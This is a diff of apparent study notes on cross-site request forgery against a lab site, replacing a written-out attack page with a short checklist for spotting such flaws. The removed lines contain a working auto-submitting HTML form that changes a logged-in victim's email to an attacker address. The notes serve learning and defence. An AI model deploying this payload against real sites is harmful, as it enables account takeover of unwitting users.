@@ -16,23 +16,21 @@ the goal is to change the email of an authenticated user on the test website sta
 
 1 create a web page that sends requests to the application's server
 
-cd /var/www/html , nano settings.html
+cd /var/www/html , nano settings.html , code
 
-<html>
-<body>
+2 if a victim who is still authenticated in the website clicks on the page created, the request will be sent with the cookie
 
-<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
-<input type="hidden" name="email" value="attacker@evilmail.thm">
-</form>
+----------------------
 
-<script>
-document.getElementById("attack").submit();
+How to spot :
 
-// redirect user after the request is sent
-setTimeout(function() {
-    window.location.href = "http://staffhub.thm:8080/settings.php";
-}, 1000);
-</script>
+1 Focus on state changing requests
 
-</body>
-</html>
+2 inspect requests for CSRF tokens
+
+3 analyse http methods, POST requests for sensitive actions 
+
+4  test requests outside the application
+
+5 observe cookie behaviour
+
